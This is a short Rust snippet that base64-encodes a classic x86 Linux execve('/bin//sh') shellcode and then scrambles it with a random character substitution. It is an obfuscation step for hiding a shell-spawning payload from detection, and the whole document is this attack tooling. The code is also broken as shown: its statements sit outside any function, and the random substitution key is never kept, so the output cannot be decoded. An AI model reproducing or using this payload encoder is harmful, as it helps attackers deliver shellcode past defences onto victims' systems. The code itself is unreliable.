use base64;
use rand::seq::SliceRandom;

// Define the shellcode to encode
let shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

// Encode the shellcode with base64
let encoded = base64::encode(shellcode);

// Create a list of random characters
let mut chars: Vec<char> = (33..127).map(|i| i as char).collect();
chars.shuffle(&mut rand::thread_rng());

// Create a dictionary of character substitutions
let subs: std::collections::HashMap<char, char> = chars
    .iter()
    .enumerate()
    .map(|(i, c)| (*c, (i as u8 + 33) as char))
    .collect();

// Substitute the characters in the encoded shellcode
let substituted: String = encoded
    .chars()
    .map(|c| subs.get(&c).unwrap())
    .collect();

// Print the encoded and substituted shellcode
println!("Encoded: {}", encoded);
println!("Substituted: {}", substituted);
